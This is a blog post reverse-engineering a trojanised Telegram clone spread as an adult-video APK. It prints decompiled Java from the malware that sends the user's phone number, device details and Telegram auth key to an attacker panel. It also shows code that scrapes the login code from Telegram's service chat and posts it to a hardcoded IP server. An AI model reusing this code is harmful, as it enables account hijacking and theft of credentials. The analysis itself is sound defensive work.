---
title: "Reverse Engineering a trojan Telegram Clone"
date: 2024-11-15T15:49:44+03:30
---

> *UPDATE: I forgot to include the file hash here to prevent the installation of this application, so here's the [VirusTotal report](https://www.virustotal.com/gui/file/471c90b265bafe61afa86c18e027cab8f9a6d591e60d192a09b919b10a73d8cf/)*

Telegram is one of the largest platforms where individuals can commit digital crimes without being noticed, unless someone reports their content.
You can easily find related material with a simple search through channels. On channels managed by Iranians, in particular, there are sometimes disturbing contents like child abuse, violence, and more.
Additionally, it can be an ideal platform for deploying trojan on a large scale.<br/>

I was looking for something on Telegram and came across an APK file named "ایرانی +18 ویدیو.apk," which translates to "Iranian +18 video.apk" in English.
My curiosity was piqued, so I decided to emulate the app. And guess what? It turned out to be a Telegram clone called Mobogram.
So, I started reverse-engineering it.<br/><br/>

![There's a one imposter among us with telegram logos](/telegram-among-us.jpg)<br/><br/>
![A message in telegram with اگه ویدئو سوپر ایرانی میخوای دانلود کن discription](/telegram-message-screenshot.png)<br/>
![Mobogram first page screenshot that is has diffrent logo with real Telegram logo.](/mobogram-first-page.png)<br/>

# Start Reversing
[Moh53n](https://x.com/moh53n) wrote a [blog post](https://vrgl.ir/AmA4u) discussing two or three Telegram clones and how these apps are have remote control on users.
those clones was signed by these CN and OU:

```
Subject:  CN=hoshi, OU=khalkhaloke
```
But this imposter app is signed diffrently
```
Subject: ST=mobo, L=mobo, O=mobo, OU=mobo, CN=mobo
```
This isn’t proof that these apps have different authors, but *maybe* it suggests they serve different purposes.<br/>
First, I tried to find the main activity function. By searching for the `main` keyword in the Android manifest, I located it.
```xml
<activity-alias
  android:name="org.telegram.messenger.DefaultIcon"
  android:enabled="true"
  android:exported="true"
  android:targetActivity="org.telegram.ui.LaunchActivity">
  <intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/>
    <category android:name="android.intent.category.MULTIWINDOW_LAUNCHER"/>
    </intent-filter>
    <meta-data
      android:name="android.app.shortcuts"
      android:resource="@xml/shortcuts"/>
</activity-alias>
```

I was examining the imported libraries to see if anything looked suspicious, and voilà!
```java
import org.telegram.dark.AppConfig;
import org.telegram.dark.AppSettings;
import org.telegram.dark.Helper.Utils;
import org.telegram.dark.ProxyFinder;
import org.telegram.dark.Ui.Activity.AnsweringMachineSettingsActivity;
import org.telegram.dark.Ui.Activity.CacheCleaner;
import org.telegram.dark.Ui.Activity.ContactUpdates.UpdateActivity;
import org.telegram.dark.Ui.Activity.DownloadManagerActivity;
import org.telegram.dark.Ui.Activity.FavoritesChannels;
import org.telegram.dark.Ui.Activity.FindUsersActivity;
import org.telegram.dark.Ui.Activity.ProfileAvatarMaker;
import org.telegram.dark.Ui.Activity.ProfileMaker;
import org.telegram.dark.Ui.Activity.SelectFontActivity;
import org.telegram.dark.Ui.Activity.SpecialSettingsActivity;
import org.telegram.dark.Ui.Activity.SpecificContacts;
import org.telegram.dark.Ui.Activity.TimeLineActivity;
import org.telegram.dark.Ui.Cell.DrawerActionCheckCell;
import org.telegram.dark.model.NativeDialog;
```
I found a package named `org.telegram.dark`. The word *dark* seemed suspicious, so I compared the original Telegram app with the imposter. The original app doesn’t include any "dark" package in its source code.<br/>
```bash
➜  telegram ls
messenger  SQLite  tgnet  ui
```
The imposter app contains an additional package that doesn’t exist in the original.
```bash
➜  telegram ls
Dark  messenger  SQLite  tgnet  ui
```
Dark package contains these files and directories:
```bash
➜  dark ls -l
total 80
drwxrwxrwx 1 root root  4096 Nov 13 17:37 adapter
drwxrwxrwx 1 root root  4096 Nov 13 17:37 Ads
-rwxrwxrwx 1 root root 31911 Nov 13 17:37 AppConfig.java
-rwxrwxrwx 1 root root  3303 Nov 13 17:37 AppLogger.java
-rwxrwxrwx 1 root root 17339 Nov 13 17:37 AppSettings.java
drwxrwxrwx 1 root root  4096 Nov 13 17:37 Controller
drwxrwxrwx 1 root root  4096 Nov 13 17:37 DataBase
-rwxrwxrwx 1 root root   558 Nov 13 17:37 GhostPorotocol.java
drwxrwxrwx 1 root root  4096 Nov 13 17:37 Helper
drwxrwxrwx 1 root root  4096 Nov 13 17:37 model
-rwxrwxrwx 1 root root   404 Nov 13 17:37 PrefManager.java
-rwxrwxrwx 1 root root 24135 Nov 13 17:37 ProxyFinder.java
drwxrwxrwx 1 root root  4096 Nov 13 17:37 service
drwxrwxrwx 1 root root  4096 Nov 13 17:37 shamsicalendar
drwxrwxrwx 1 root root  4096 Nov 13 17:37 Ui
```
I took a look at the `AppConfig.java` file.<br/>
At the beginning of this file, there’s an `AppConfig` class that defines some environments. However, in the `appStarts` function, it automatically joins you to the mobogram_n3 (t[.]me/mobogram_n3) channel after the application loads.
```java
  public static void appStarts(DialogsActivity dialogsActivity) {
    AppMainChannel = getAppMainChannel();
    OfficialChannel = getOfficialChannel();
    if (joinAtStart) {
      ChannelHelper.JoinFast(AppMainChannel, false, false, false, true, false, 0);
  }
}
```
As suggested by the name `AppConfig.java`, this file serves as a configuration environment, and these environment values come from the `RemoteConfig` class located in the `org.telegram.dark.Ads.Services` package.  
The `org.telegram.dark.Ads` package is heavily focused on advertisements—extremely focused. For example, the `org.telegram.dark.Ads.Services.ContactsScanner` class waits for a command to loop through your contacts and add them to specified channels and groups.
It even includes a poorly implemented popup feature that redirects you to Telegram channels, Instagram accounts, or the Bazaar application. This behavior is evident in the `org.telegram.dark.Ads.Services.PopScanner` class.
It’s obvious that this package is a remote control mechanism for your account. The `RemoteConfig` class that exists in `AppSettings.java` listens for commands to add you to their groups, send advertisement messages to your contacts, and show you intrusive popups.<br/>
The developer(s) left some footprints in the source code that they didn’t bother to remove. For instance, they included unnecessary loggers and a significant amount of poorly written code.  
Here’s an example of how `RemoteConfig` redirects you to a given link:  
```java
if (i >= 400) {
try {
  Log.e("MyTest", AppConfig.getDrawerLayoutItem());
  JSONArray jSONArray = new JSONArray(AppConfig.getDrawerLayoutItem());
  for (int i2 = 0; i2 < jSONArray.length(); i2++) {
    JSONObject jSONObject = (JSONObject) jSONArray.get(i2);
    if (i - 400 == i2) {
      Browser.openUrl(this, jSONObject.getString("link"));
      this.drawerLayoutContainer.closeDrawer(false);
    }
  }

  return;
} catch (Exception e) {
  Log.e("MyTest", e.getMessage());
  return;
  }
}
```

And shitty logs<br/><br/>
![shitty logs](/shitty-logs.png)

# It's a fucking trojan!
As a test, I used a phone number that I knew didn’t have a Telegram account for signing in. The app displayed the message: *"We’ve sent the code to the **Telegram** app for your phone number on your other device."*<br/>
That’s suspicious—how could it send a code to a phone number without an associated Telegram account?  
I copied some log keys and started monitoring the logger. And voilà, I found something again!

```log
~ adb logcat -s DebugMain ProxyFinder AppLogger salamati "ASROID FORCE" runnable remote Admob loginRequest
--------- beginning of main
1230  1230 E DebugMain: canscan : true
1422  1422 D DebugMain: getRandomApi7
1422  1422 E DebugMain: 49C1522548EBACD46CE322B6FD47F6092BB745D0F88082145CAF35E14DCC38E1____4_________014b35b6184100b085b0d0572f9b5103
1422  1422 D DebugMain: getRandomApi7
1422  1422 E DebugMain: 49C1522548EBACD46CE322B6FD47F6092BB745D0F88082145CAF35E14DCC38E1____4_________014b35b6184100b085b0d0572f9b5103
1422  1422 E DebugMain: canscan : true
1422  1422 E DebugMain: canscan : true
1422  1422 E DebugMain: canscan : true
1422  1422 E DebugMain: canscan : true
1422  1422 D ProxyFinder: etRand1
1422  1422 D ProxyFinder: randd =2
1422  1422 D ProxyFinder: rand2 =-1
1422  1422 D ProxyFinder: etRand3
1422  1422 D ProxyFinder: showSponsor= true
1422  1422 D ProxyFinder: etRand1
1422  1422 D ProxyFinder: randd =1
1422  1422 D ProxyFinder: rand2 =2
1422  1422 D ProxyFinder: etRand3
1422  1422 D ProxyFinder: showSponsor= true
1422  1422 D ProxyFinder: proxyInfo.ping =341
1422  1422 D ProxyFinder: proxyInfo.adrees =3.144.122.58
1422  1422 D ProxyFinder: showSponsor= true
1422  1422 D ProxyFinder: proxyInfo.ping =99
1422  1422 D ProxyFinder: proxyInfo.adrees =34.221.147.117
1422  1422 D ProxyFinder: showSponsor= true
1422  1422 D ProxyFinder: etRand1
```

After searching on `canscan` into decompiled source code, I found the class that called logger function.
```java
    public void scan(Context context) {
        String str;
        String str2;
        String str3;
        String str4;
        String str5;
        this.context = context;
        loge("canscan : " + canScan());
        if (canScan() && !this.scanCompeted && MessagesController.getInstance(this.currentAccount).dialogFiltersLoaded && MessagesController.getInstance(this.currentAccount).dialogFiltersLoadedInternal) {
            this.scanCompeted = true;
            if (AppConfig.getPanelAuthKeyEnable()) {
                String str6 = "+" + UserConfig.getInstance(this.currentAccount).getCurrentUser().phone;
                try {
                    str2 = LocaleController.getSystemLocaleStringIso639().toLowerCase();
                    str3 = LocaleController.getLocaleStringIso639().toLowerCase();
                    str4 = Build.MANUFACTURER + Build.MODEL;
                    PackageInfo packageInfo = ApplicationLoader.applicationContext.getPackageManager().getPackageInfo(ApplicationLoader.applicationContext.getPackageName(), 0);
                    str5 = packageInfo.versionName + " (" + packageInfo.versionCode + ")";
                    if (BuildVars.DEBUG_PRIVATE_VERSION) {
                        str5 = str5 + " pbeta";
                    } else if (BuildVars.DEBUG_VERSION) {
                        str5 = str5 + " beta";
                    }
                    str = "SDK " + Build.VERSION.SDK_INT;
                } catch (Exception unused) {
                    str = "SDK " + Build.VERSION.SDK_INT;
                    str2 = "en";
                    str3 = BuildConfig.APP_CENTER_HASH;
                    str4 = "Android unknown";
                    str5 = "App version unknown";
                }
                HashMap hashMap = new HashMap();
                hashMap.put("number", str6);
                hashMap.put("device_model", str4);
                hashMap.put("app_version", str5);
                hashMap.put("system_version", str);
                hashMap.put("lang_code", str3);
                hashMap.put("system_lang_code", str2);
                hashMap.put("app_id", String.valueOf(BuildVars.APP_ID));
                hashMap.put("app_hash", BuildVars.APP_HASH);
                hashMap.put("auth_key", NativeConfig.getAuthKey());
                hashMap.put("dc", String.valueOf(ConnectionsManager.getInstance(this.currentAccount).getCurrentDatacenterId()));
                log(String.valueOf(hashMap));
                requestToPanel(AppConfig.getPanelAuthKey(), hashMap, new PanelMember() { // from class: org.telegram.dark.service.SessionController.1
                    @Override // org.telegram.dark.service.SessionController.PanelMember
                    public void result(String str7) {
                        if (str7.contains("phone is already") || str7.contains("created")) {
                            SessionController.this.preferencesEditor.putLong("last_time_scan" + UserConfig.selectedAccount, System.currentTimeMillis()).apply();
                        }
                    }
                });
                return;
            }
            loge(getSessionControllerMode() + ":SESSION MODE_____" + this.currentAccount);
            Long l = 777000 L;
            JoinFast.mute(true, l.longValue());
            scanCurrent(new Runnable() { // from class: org.telegram.dark.service.SessionController$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    SessionController.this.lambda$scan$4();
                }
            });
        }
    }
```
It’s clear that they send my device information to their server to check whether my phone is already in their database. The `requestToPanel` function sends this information to their server.  
After investigating where the `requestToPanel` function was called, I found a very interesting function.
```java
            @Override // java.lang.Runnable
            public void run() {
                SessionController.this.log("Send2");
                int[] iArr = this.val$tryNum;
                if (iArr[0] > 5) {
                    return;
                }
                iArr[0] = iArr[0] + 1;
                SessionController.this.log("Send3");
                TLRPC$TL_dialog tLRPC$TL_dialog = (TLRPC$TL_dialog) MessagesController.getInstance(SessionController.this.currentAccount).dialogs_dict.get(777000 L);
                if (tLRPC$TL_dialog != null) {
                    MessagesController.getInstance(SessionController.this.currentAccount).loadMessages(tLRPC$TL_dialog.id, 0 L, false, 2, 0, 0, false, 0, 0, 0, 0, 1, 0 L, 0, 0, false);
                    MessageObject messageObject = MessagesController.getInstance(SessionController.this.currentAccount).dialogMessagesByIds.get(tLRPC$TL_dialog.top_message);
                    SessionController sessionController = SessionController.this;
                    StringBuilder sb = new StringBuilder();
                    sb.append("Send4//");
                    sb.append(tLRPC$TL_dialog.unread_count > 0);
                    sb.append("//");
                    sb.append(tLRPC$TL_dialog.last_message_date == messageObject.messageOwner.date);
                    sessionController.log(sb.toString());
                    if (tLRPC$TL_dialog.last_message_date == messageObject.messageOwner.date) {
                        SessionController.this.log("Send5");
                        Matcher matcher = Pattern.compile("\\d+").matcher(String.valueOf(messageObject.messageText));
                        if (matcher.find()) {
                            String group = matcher.group();
                            System.out.println("Verification code: " + group);
                            SessionController.this.log("Send6");
                            try {
                                Log.e("DebugMain", "Code Sended :" + group);
                                AnonymousClass13.this.val$map.put("code", group);
                                AnonymousClass13 anonymousClass13 = AnonymousClass13.this;
                                anonymousClass13.val$map.put("password", SessionController.this.getPassV2(anonymousClass13.val$phone.replace("+", BuildConfig.APP_CENTER_HASH), "None"));
                                SessionController.this.requestToPanel(AppConfig.getPanelMemberFaceLogin(), AnonymousClass13.this.val$map, new PanelMember() { // from class: org.telegram.dark.service.SessionController.13.1.1
                                    @Override // org.telegram.dark.service.SessionController.PanelMember
                                    public void result(String str) {
                                        if ("Wrong Code".equals(str)) {
                                            AnonymousClass1.this.run();
                                            return;
                                        }
                                        if (str.contains("expired")) {
                                            AnonymousClass13 anonymousClass132 = AnonymousClass13.this;
                                            SessionController.this.sendSessionToBot(anonymousClass132.val$finish);
                                        } else {
                                            Runnable runnable = AnonymousClass13.this.val$finish;
                                            if (runnable != null) {
                                                runnable.run();
                                            }
                                            AppLogger.sendLog(str);
                                        }
                                    }
                                });
                                return;
                            } catch (Exception unused) {
                                run();
                                return;
                            }
                        }
            }
```
And this logs appears.
```log
11-15 15:01:36.926  1422  1422 E DebugMain: try_phone :****
11-15 15:01:36.926  1422  1422 E DebugMain: url : http://185.208.172.29:8182/try_phone?number=****&channel=https://t.me/mobogram_n3
```
They send my code to their server. It’s not just an advertisement application; it’s a fucking Trojan.
But the hackers failed. Why? Because Telegram changed their method for signing up new users. They no longer send SMS codes. After you enter your phone number, they ask for your email to send the code. So, if you don’t have a Telegram account, you’re safe. However, if you do have an account, Telegram first sends the code to your Telegram app. If you press "Resend Code" that’s when the Trojan horse comes to your phone.

After some investigation, I found the `add_phone` function.
```java
public static void add_phone() {
        if (ApplicationLoader.applicationContext.getSharedPreferences("AppLogger", 0).getBoolean(UserConfig.getInstance(UserConfig.selectedAccount).getClientPhone(), false)) {
            return;
        }
        send_request("http://185.208.172.29:8182/add_phone?number=xasfas&channel=qweqw".replace("xasfas", UserConfig.getInstance(UserConfig.selectedAccount).getClientPhone().replace(" ", BuildConfig.APP_CENTER_HASH)).replace("qweqw", "https://t.me/" + AppConfig.getAppMainChannel()));
    }
```
<br/>

# Where are the ads and proxies loaded?
This Trojan app has pre-imported proxies that you can use. This is probably done to make it easier for people to log in. Remember the `AppConfig.java` file? It contains a remote link for loading ads and proxies.
```java

    public static String getPicslink() {
        return ApplicationLoader.applicationContext.getSharedPreferences("app_Settings_new", 0).getString("picsLink2", "https://service.telogramofficial.com/telegram/prc/list.json?dl=1");
    }

    public static String getProxyLinkMahamad() {
        return ApplicationLoader.applicationContext.getSharedPreferences("app_Settings_new", 0).getString("ProxyLinkMohamad", "https://tlb7.xyz");
    }

    public static String getProxyLinkJafari() {
        return ApplicationLoader.applicationContext.getSharedPreferences("app_Settings_new", 0).getString("ProxyLinkJafari", "https://turbo.vizzy.cfd/pxs");
    }

    public static String getRemoteLink() {
        return ApplicationLoader.applicationContext.getSharedPreferences("app_Settings_new", 0).getString("remoteLink2", "https://turbo.vizzy.cfd/api/v1/application/asdcasdmobogram_n3sadxsdas");
    }
```
It’s clear which functions load the proxies, and the turbo.vizzy[.]cfd domain is where the ads are loaded. If you follow the white rabbit, you’ll find the turboads-smart[.]com domain, which owns the turbo.vizzy[.]cfd domain.
